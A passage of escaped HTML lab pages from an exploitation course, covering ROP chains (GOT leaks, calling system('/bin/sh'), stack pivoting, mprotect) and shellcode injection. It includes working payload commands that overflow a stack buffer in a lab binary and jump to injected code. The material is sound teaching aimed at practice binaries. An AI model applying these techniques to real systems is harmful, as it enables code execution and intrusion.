&lt;p>For the actual parameter use the &lt;code>&amp;quot;sh&amp;quot;&lt;/code> string already present in the vulnerable binary. Use searchmem in GDB to find the &lt;code>&amp;quot;sh&amp;quot;&lt;/code> string in the executable.&lt;/p>
&lt;/blockquote>
&lt;h3 id="02-challenge---handling-low-stack-space">02. Challenge - Handling Low Stack Space&lt;/h3>
&lt;p>The previous binary had the luxury of plenty of stack space to be overflown. It is often the case that we don&amp;rsquo;t have enough space for a long ROP chain. Let&amp;rsquo;s handle that.&lt;/p>
&lt;p>For the current task, switch to the &lt;code>02-low-stack-space/src&lt;/code> sub-folder. The extra constraint here is that huge ropchains are no longer an option.&lt;/p>
&lt;p>Find out how much space you have in the overflow and assess the situation.&lt;/p>
&lt;blockquote>
&lt;p>Use &lt;code>gdb&lt;/code> and the cyclic pattern to get the information required.&lt;/p>
&lt;/blockquote>
&lt;p>Now follow the steps below.&lt;/p>
&lt;p>First trigger the info leak as before.&lt;/p>
&lt;blockquote>
&lt;p>Use &lt;code>write&lt;/code> and leak the address of a GOT value. Use this to compute the address of the &lt;code>system&lt;/code> call.&lt;/p>
&lt;/blockquote>
&lt;p>You can only construct a partial ropchain. A longer one won&amp;rsquo;t fit. So after calling &lt;code>write&lt;/code>, call &lt;code>main&lt;/code> again.&lt;/p>
&lt;blockquote>
&lt;p>Note that using &lt;code>sendline&lt;/code> means sending out a newline character (&lt;code>'\n'&lt;/code>) at the end of the message. If you want to strictly send out a message without a newline, use &lt;code>send&lt;/code>.&lt;/p>
&lt;p>Find the address of &lt;code>main&lt;/code> by looking at the argument for the &lt;code>__libc_start_main&lt;/code> function. Check the disassembling of the program and see what is the parameter passed to the &lt;code>__libc_start_main call&lt;/code>.&lt;/p>
&lt;p>After calling &lt;code>main&lt;/code> again you will get back to the initial situation where you can exploit the buffer overflow.&lt;/p>
&lt;/blockquote>
&lt;p>Insert &lt;code>&amp;quot;sh&amp;quot;&lt;/code> string.&lt;/p>
&lt;blockquote>
&lt;p>This time you don&amp;rsquo;t have the &lt;code>&amp;quot;sh&amp;quot;&lt;/code> string in the binary, but you can find it in &lt;strong>the libc binary itself&lt;/strong> so you can compute it the same way you compute the &lt;code>system&lt;/code> address. In pwntools:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">sh&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#204a87">next&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">libc&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">search&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;/bin/sh&lt;/span>&lt;span style="color:#4e9a06">\x00&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>Call &lt;code>system&lt;/code>.&lt;/p>
&lt;h3 id="03-challenge---stack-pivoting">03. Challenge - Stack Pivoting&lt;/h3>
&lt;p>Let&amp;rsquo;s assume that &lt;code>main&lt;/code> function had additional constraints that made it impossible to repeat the overflow. How can we still solve it? The method is called stack pivoting. In short, this means making the stack pointer refer another (writable) memory area that has enough space, a memory area that we will populate with the actual ROP chain.&lt;/p>
&lt;blockquote>
&lt;p>Read more about stack pivoting &lt;a href="http://neilscomputerblog.blogspot.ro/2012/06/stack-pivoting.html">here&lt;/a>.&lt;/p>
&lt;/blockquote>
&lt;p>Tour goal is to fill the actual ROP chain to a large enough memory area. We need a two stage exploit:&lt;/p>
&lt;ul>
&lt;li>In the first stage, prepare the memory area where to fill the second stage ROP chain; then fill the memory area with the second stage ROP chain.&lt;/li>
&lt;li>In the second stage, create the actual ROP chain and feed it to the program and profit.&lt;/li>
&lt;/ul>
&lt;p>Follow the steps below.&lt;/p>
&lt;p>Use pmap or vmmap in &lt;code>pwndbg&lt;/code> to discover the writable data section of the process. Select an address in that section (&lt;strong>don&amp;rsquo;t&lt;/strong> use the start address). This is where you fill the 2nd stage data (the actual ROP chain).&lt;/p>
&lt;blockquote>
&lt;p>Who not use the start address? Because &lt;code>pop&lt;/code> instructions (which decrease the &lt;code>rsp&lt;/code>) will go outside the memory region.&lt;/p>
&lt;/blockquote>
&lt;p>Create a first stage payload that calls &lt;code>read&lt;/code> to store the 2nd stage data to the newly found memory area. After that pivot the stack pointer to the memory area address.&lt;/p>
&lt;blockquote>
&lt;p>At a given address in the executable you have a call to &lt;code>read&lt;/code> followed by a &lt;code>leave; ret&lt;/code> gadget. This sequence of instructions allows you to read data and then pivot the stack.&lt;/p>
&lt;p>The leave instruction fills the stack pointer (&lt;code>rsp&lt;/code>) with the address of the frame pointer (&lt;code>rbp&lt;/code>). It&amp;rsquo;s equivalent to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rsp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rbp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">pop&lt;/span> &lt;span style="color:#000">rbp&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>Write the actual ROP chain as a second stage payload like when we didn&amp;rsquo;t have space constraints. The 2nd stage will be stored to the memory area and the stack pointer will point to that.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Important!&lt;/strong> Be careful when and where the stack pivoting takes place. After the &lt;code>mov rsp, rbp&lt;/code> part of the &lt;code>leave&lt;/code> instruction happens your stack will be pivoted, so the following &lt;code>pop rbp&lt;/code> will happen &lt;strong>on the new stack&lt;/strong>. Take this offset into account when building the payload.&lt;/p>
&lt;/blockquote>
&lt;h3 id="04-challenge---mprotect">04. Challenge - mprotect&lt;/h3>
&lt;p>Combine everything you&amp;rsquo;ve learned until now and develop a complex payload to call &lt;code>mprotect&lt;/code> to change the permissions on a memory region to read+write+execute and then instert a &lt;em>shellcode&lt;/em> to call &lt;code>system(&amp;quot;/bin/sh&amp;quot;)&lt;/code>.&lt;/p>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://syscalls.kernelgrok.com/">https://syscalls.kernelgrok.com/&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://articles.manugarg.com/systemcallinlinux2_6.html">http://articles.manugarg.com/systemcallinlinux2_6.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries#the-procedure-linkage-table-plt">https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries#the-procedure-linkage-table-plt&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/Gallopsled/pwntools-tutorial/tree/master/walkthrough">https://github.com/Gallopsled/pwntools-tutorial/tree/master/walkthrough&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Binary:</title><link>/binary/shellcodes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/shellcodes/</guid><description>
&lt;details open>
&lt;summary>Table of contents&lt;/summary>
&lt;ul>
&lt;li>&lt;a href="#introduction">Introduction&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#stack-buffer-overflow-recap">Stack-buffer-overflow recap&lt;/a>&lt;/li>
&lt;li>&lt;a href="#code-injection">Code injection&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#develop">Develop&lt;/a>&lt;/li>
&lt;li>&lt;a href="#inject">Inject&lt;/a>&lt;/li>
&lt;li>&lt;a href="#trigger">Trigger&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#shellcodes">&amp;ldquo;Shellcodes&amp;rdquo;&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#tutorials">Tutorials&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#01-tutorial-generating-machine-code">01. Tutorial: generating machine code&lt;/a>&lt;/li>
&lt;li>&lt;a href="#02-tutorial-inspecting-machine-code">02. Tutorial: inspecting machine code&lt;/a>&lt;/li>
&lt;li>&lt;a href="#03-tutorial-feeding-machine-code-to-a-program">03. Tutorial: feeding machine code to a program&lt;/a>&lt;/li>
&lt;li>&lt;a href="#04-tutorial-hello-world-shellcode">04. Tutorial: &amp;ldquo;Hello, world!&amp;rdquo; shellcode&lt;/a>&lt;/li>
&lt;li>&lt;a href="#05-tutorial-debugging-shellcodes">05. Tutorial: Debugging shellcodes&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#challenges">Challenges&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#06-challenge-binsh-shellcode">06. Challenge: /bin/sh shellcode&lt;/a>&lt;/li>
&lt;li>&lt;a href="#07-challenge-shellcode-on-stack">07. Challenge: shellcode on stack&lt;/a>&lt;/li>
&lt;li>&lt;a href="#08-challenge-shellcode-after-saved-ret">08. Challenge: shellcode after saved ret&lt;/a>&lt;/li>
&lt;li>&lt;a href="#09-challenge-shellcode-after-saved-ret---no-leak">09. Challenge: shellcode after saved ret - no leak&lt;/a>&lt;/li>
&lt;li>&lt;a href="#10-challenge-shellcode-as-command-line-arg">10. Challenge: shellcode as command line arg&lt;/a>&lt;/li>
&lt;li>&lt;a href="#11-challenge-shellcode-in-the-environment">11. Challenge: shellcode in the environment&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#further-reading">Further Reading&lt;/a>&lt;/li>
&lt;li>&lt;a href="#resources">Resources&lt;/a>&lt;/li>
&lt;/ul>
&lt;/details>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;h2 id="stack-buffer-overflow-recap">Stack-buffer-overflow recap&lt;/h2>
&lt;p>In the last session, we studied what an attacker can do to a program with a stack-buffer-overflow vulnerability: fill up the legitimately reserved space with junk, then overwrite the saved-return value with an address of their choosing. After the vulnerable function&amp;rsquo;s execution ends, its final &lt;code>ret&lt;/code> will place the attacker&amp;rsquo;s chosen address into the &lt;code>eip&lt;/code>/&lt;code>rip&lt;/code> and execution will continue from there.&lt;/p>
&lt;img src="./assets/stack_buffer.png" width="600">
&lt;p>The above scenario limits the attacker to the functionality already present in the vulnerable program. If an attacker desires to spawn a shell, but no shell-spawning code is already present - tough luck! In this session we will start studying a method of overcoming this limitation: code injection.&lt;/p>
&lt;h2 id="code-injection">Code injection&lt;/h2>
&lt;p>If the code we want to execute is not present in the target program, we&amp;rsquo;ll simply add it ourselves! We will implement our desired functionality in machine code, inject (which is just a fancy word for &amp;ldquo;write&amp;rdquo;) it into the target process&amp;rsquo; memory, then force execution to jump to the beginning of our code. These steps can be succinctly summarized as: develop, inject, trigger.&lt;/p>
&lt;h3 id="develop">Develop&lt;/h3>
&lt;p>First, we need to implement our desired functionality. Our goal is to obtain &lt;em>something&lt;/em> that can be placed directly into the memory space of a running process and be executed; so it cannot be text representing code in C, Python, Java etc. It must be &lt;em>machine code&lt;/em>. This might seem a very difficult task, but we&amp;rsquo;ll simply use the tools we usually employ when writing code that we intend to run; in particular, we will rely on the assembler: we write ASM code to do what we want, then assemble it to obtain a string of machine code bytes.&lt;/p>
&lt;h3 id="inject">Inject&lt;/h3>
&lt;p>Once we have our string of machine code bytes, we need it to be present in the memory space of the target process. This means the program must read some input (with a &lt;code>gets&lt;/code>, &lt;code>fgets&lt;/code>, &lt;code>fscanf&lt;/code>, &lt;code>read&lt;/code> etc.). However, if we can &lt;em>launch&lt;/em> the program, we can also place our code in the environment or inside a command line argument; even if a program doesn&amp;rsquo;t use these, the loader still places them in its address space.&lt;/p>
&lt;h3 id="trigger">Trigger&lt;/h3>
&lt;p>After having placed our code inside the memory space of the target process, we need to force execution to jump at its beginning. We already know how to do this, by means of a stack-buffer-overflow, which we studied in the previous session.&lt;/p>
&lt;h2 id="shellcodes">&amp;ldquo;Shellcodes&amp;rdquo;&lt;/h2>
&lt;p>Usually, the end-goal of an attacker is to force the program to spawn a shell, thus gaining unlimited access. This can be achieved by injecting machine code that triggers an &lt;code>execve(&amp;quot;/bin/sh&amp;quot;, [&amp;quot;/bin/sh&amp;quot;, NULL], NULL)&lt;/code> system call, hence the name &amp;ldquo;shellcode&amp;rdquo;. However, this label is also used for any piece of injected code, even if it does not spawn a shell.&lt;/p>
&lt;h1 id="tutorials">Tutorials&lt;/h1>
&lt;h2 id="01-tutorial-generating-machine-code">01. Tutorial: generating machine code&lt;/h2>
&lt;p>To address the first step of our code injection technique, we will start with a simple example: we want to force the program to end cleanly with an exit code of 42; more precisely we want to execute an &lt;code>exit(42)&lt;/code> system call.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-nasm" data-lang="nasm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">BITS&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rdi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">42&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">60&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">syscall&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux Syscall Table&lt;/a>&lt;/p>
&lt;p>We can then use &lt;code>nasm&lt;/code> to obtain a file with machine code:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nasm exit_shellcode.nasm -o exit_shellcode.bin
&lt;/code>&lt;/pre>&lt;p>&lt;strong>NOTE:&lt;/strong> &lt;code>exit_shellcode.bin&lt;/code> is not an ELF:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ file exit_shellcode.bin
exit_shellcode.bin: data
&lt;/code>&lt;/pre>&lt;p>It is not an executable file at all, but simply contains a raw string of machine code bytes. You can see that it is very, very small:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ wc --bytes exit_shellcode.bin
12 exit_shellcode.bin
&lt;/code>&lt;/pre>&lt;h2 id="02-tutorial-inspecting-machine-code">02. Tutorial: inspecting machine code&lt;/h2>
&lt;p>We would also like to be able to do the reverse of this: given a file that contains a raw string of machine code bytes, translate it back into readable assembly. This is useful to check that our assembly process was correct, as well as for analyzing files that we did not create.&lt;/p>
&lt;p>In &lt;a href="../exploration-tools">the first session&lt;/a>, we learned to disassemble using &lt;code>objdump&lt;/code>. By default, &lt;code>objdump&lt;/code> expects a proper &lt;code>ELF&lt;/code> executable and complains about our raw file:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -d -M intel exit_shellcode.bin
objdump: exit_shellcode.bin: file format not recognized
&lt;/code>&lt;/pre>&lt;p>We need to use the following command:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -D -b binary -m i386:x86-64 -M intel exit_shellcode.bin
test.bin: file format binary
Disassembly of section .data:
0000000000000000 &amp;lt;.data&amp;gt;:
0: 48 c7 c0 ff ff ff ff mov rax,0xffffffffffffffff
7: bf 2a 00 00 00 mov edi,0x2a
c: b8 3c 00 00 00 mov eax,0x3c
11: 0f 05 syscall
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>-D&lt;/code>: disassemble all, not only text/code zones. In our case this means disassemble the whole file.&lt;/li>
&lt;li>&lt;code>-b binary&lt;/code>: treat the file as not having a specific object/executable format (such as ELF, COFF, Mach-O or PE).&lt;/li>
&lt;li>&lt;code>-m i386:86-64&lt;/code>: the machine code inside the binary file is i386 (x86), 64 bits (usually, &lt;code>objdump&lt;/code> gets this information from the ELF header).&lt;/li>
&lt;li>&lt;code>-M intel&lt;/code>: display ASM using Intel assembly syntax, as opposed to AT&amp;amp;T assembly syntax.&lt;/li>
&lt;/ul>
&lt;p>We can also use a tool like &lt;code>xxd&lt;/code> or &lt;code>hexdump&lt;/code> to inspect the byte values in the file, without disassembling:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ xxd exit_shellcode.bin
00000000: 48c7 c0ff ffff ffbf 2a00 0000 b83c 0000 H.......*....&amp;lt;..
00000010: 000f 05 ...
&lt;/code>&lt;/pre>&lt;h2 id="03-tutorial-feeding-machine-code-to-a-program">03. Tutorial: feeding machine code to a program&lt;/h2>
&lt;p>Now that we know how to obtain a bytestring of machine code from an assembly program, it&amp;rsquo;s time to move on to the next step: injection. The simplest way is to redirect the &lt;code>stdin&lt;/code> of the target program to the file containing our raw machine code.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ./vuln &amp;lt; exit_shellcode.bin
&lt;/code>&lt;/pre>&lt;p>However, we might want to freely edit the payload directly on the command line (for example, if the program reads some other stuff). The way to do this is to use another tool, like the shell itself, to transform hexadecimal notation into binary data:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ printf &amp;#39;\x4b\x80\x04\x08&amp;#39;
K�
&lt;/code>&lt;/pre>&lt;p>Again, we can use a tool like &lt;code>xxd&lt;/code> for the reverse operation, to verify that the binary data comes out as intended:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ printf &amp;#39;\x4b\x80\x04\x08&amp;#39; | xxd -p
4b800408
&lt;/code>&lt;/pre>&lt;p>If our machine code is contained in a file, we can use &lt;code>hexdump&lt;/code> to obtain an escaped hexadecimal representation of its contents:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ hexdump -v -e &amp;#39;&amp;#34;\\&amp;#34; 1/1 &amp;#34;x%02x&amp;#34;&amp;#39; exit_shellcode.bin
\x48\xc7\xc0\xff\xff\xff\xff\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05
&lt;/code>&lt;/pre>&lt;p>Which we can then combine with some other input&lt;/p>
&lt;pre tabindex="0">&lt;code>$ printf &amp;#39;1\x48\xc7\xc0\xff\xff\xff\xff\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05&amp;#39; | ./vuln2
&lt;/code>&lt;/pre>&lt;p>Or we can do this directly:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ printf &amp;#39;1&amp;#39;$(hexdump -v -e &amp;#39;&amp;#34;\\&amp;#34; 1/1 &amp;#34;x%02x&amp;#34;&amp;#39; exit_shellcode.bin) | ./vuln2
&lt;/code>&lt;/pre>&lt;p>We can then verify that the program did indeed exit with code 42:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ echo $?
42
&lt;/code>&lt;/pre>&lt;h2 id="04-tutorial-hello-world-shellcode">04. Tutorial: &amp;ldquo;Hello, world!&amp;rdquo; shellcode&lt;/h2>
&lt;p>Our aim now is to develop a shellcode that prints &lt;code>&amp;quot;Hello, world!\n&amp;quot;&lt;/code> to stdout, then inject it into &lt;code>vuln&lt;/code> and trigger its execution.&lt;/p>
&lt;p>We start by writing a shellcode that does a &lt;code>write(1, &amp;quot;Hello, world!\n&amp;quot;, 14)&lt;/code> system call, by writing the string on to the stack such that the stack pointer points to the beginning of the string.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-nasm" data-lang="nasm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">; Write &amp;#34;Hello, world!\n&amp;#34; to the standard output.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">BITS&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">; We can&amp;#39;t push 64 bit constants, but we can push 64 bit registers.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rbx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">`orld!\n`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">push&lt;/span> &lt;span style="color:#204a87">rbx&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rbx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">`Hello, w`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">push&lt;/span> &lt;span style="color:#204a87">rbx&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rsi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#204a87">rsp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rdx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">14&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rdi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">syscall&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is just one way to do it and there are other possible approaches to it.&lt;/p>
&lt;p>We then assemble our snippet to get a string of machine code bytes (the &lt;code>Makefile&lt;/code> provided already does this).&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nasm hello_shellcode.nasm -o hello_shellcode.bin
&lt;/code>&lt;/pre>&lt;p>Our vulnerable program first reads 128 bytes into a global buffer (line 8):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">machine_code&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">128&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Our shellcode-injecting payload needs to consist of the shellcode itself and some junk to pad the payload length to 128. First, we need to determine the shellcode size in bytes, then we use a tool like python to generate the string:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ wc -c hello_shellcode.bin
42 hello_shellcode.bin
$ perl -e &amp;#34;print \&amp;#34;$(hexdump -v -e &amp;#39;&amp;#34;\\&amp;#34; 1/1 &amp;#34;x%02x&amp;#34;&amp;#39; ./hello_shellcode.bin)\&amp;#34; . \&amp;#34;A\&amp;#34; x (128 - 42)&amp;#34;
&lt;/code>&lt;/pre>&lt;p>We then move on to the second part of our exploit, in which we hijack control flow by exploiting a stack-buffer-overflow in which 128 bytes are read into a 16 byte buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">16&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">128&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>All we need to do is to pad the legitimately reserved space until the saved return address, then overwrite it with the address of &lt;code>machine_code&lt;/code>. Thus we will probably need 16 + 8 (the saved &lt;code>rbp&lt;/code>) bytes of padding, but remember that we can&amp;rsquo;t rely on the layout we see in C and must inspect the binary:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -d -M intel ./vuln
...
0000000000401126 &amp;lt;main&amp;gt;:
401126: 55 push rbp
401127: 48 89 e5 mov rbp,rsp
40112a: 48 83 ec 10 sub rsp,0x10 &amp;lt;---- Here we see that there are, indeed, just 16 bytes reserved on this stack frame
...
&lt;/code>&lt;/pre>&lt;p>We then determine the address of the global buffer which holds our code and craft our second payload (remember to reverse the bytes because our systems are little endian):&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nm ./vuln | grep machine_code
0000000000404060 T machine_code
$ perl -e &amp;#39;print &amp;#34;A&amp;#34; x (16 + 8) . &amp;#34;\x60\x40\x40\x00\x00\x00\x00\x00&amp;#34;&amp;#39;
&lt;/code>&lt;/pre>&lt;p>Now all we need to do is concatenate our two payloads:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ perl -e &amp;#34;print \&amp;#34;$(hexdump -v -e &amp;#39;&amp;#34;\\&amp;#34; 1/1 &amp;#34;x%02x&amp;#34;&amp;#39; ./hello_shellcode.bin)\&amp;#34; . \&amp;#34;A\&amp;#34; x (128 - 42) . \&amp;#34;A\&amp;#34; x (16 + 8) . \&amp;#34;\x60\x40\x40\x00\x00\x00\x00\x00\&amp;#34;&amp;#34; | ./vuln
Hello, world!
[1] 53760 done perl -e |
53762 segmentation fault (core dumped) ./vuln
&lt;/code>&lt;/pre>&lt;p>As you can see, even with simple exploits, payloads quickly become unwieldy. Our advice is to make use of a script in a language like python. There is one such script example in the task directory.&lt;/p>
&lt;p>Even though we succeeded in printing our message, the program then ended abruptly with a &lt;em>Segmentation fault&lt;/em>. Pause for a second to figure out why that is.&lt;/p>
&lt;details>
&lt;summary>Answer here&lt;/summary>
&lt;p>Because we hijacked normal control flow, the program does not reach the end of the &lt;code>main&lt;/code> function to terminate gracefully, but instead continues to attempt to execute instructions from the &lt;code>machine_code&lt;/code> global var. We can help the program exit gracefully by extending our shellcode to also perform an &lt;code>exit(0)&lt;/code> syscall after the &lt;code>write&lt;/code>. Remember to check the size of the new shellcode and update the padding accordingly!&lt;/p>
&lt;/details>
&lt;h2 id="05-tutorial-debugging-shellcodes">05. Tutorial: Debugging shellcodes&lt;/h2>
&lt;p>How can we &lt;strong>know&lt;/strong> that our shellcode worked properly? Sometimes its external effects are not immediately visible; if it involves any system calls, we can make use of &lt;code>strace&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ printf &amp;#39;1&amp;#39;$(hexdump -v -e &amp;#39;&amp;#34;\\&amp;#34; 1/1 &amp;#34;x%02x&amp;#34;&amp;#39; exit_shellcode.bin) | strace ./vuln2
execve(&amp;#34;./vuln2&amp;#34;, [&amp;#34;./vuln2&amp;#34;], 0x7ffdb027a9d0 /* 77 vars */) = 0
....
exit(42) = ?
+++ exited with 42 +++
&lt;/code>&lt;/pre>&lt;p>A more productive approach is to use &lt;code>gdb&lt;/code> to inspect the execution of the shellcode step by step. Load the program, break on the shellcode address, feed it the input and run:&lt;/p>
&lt;details>
&lt;summary>GDB output&lt;/summary>
&lt;pre tabindex="0">&lt;code>$ gdb ./vuln
Reading symbols from ./vuln...
gdb-peda$ b *main+56
Breakpoint 1 at 0x40115e: file vuln.c, line 11.
gdb-peda$ r &amp;lt; payload
Starting program: /home/mihai/gits/sss-exploit-internal/sessions/07-shellcodes/activities/04-tutorial-hello-world-shellcode/src/vuln &amp;lt; payload
[----------------------------------registers-----------------------------------]
RAX: 0x0
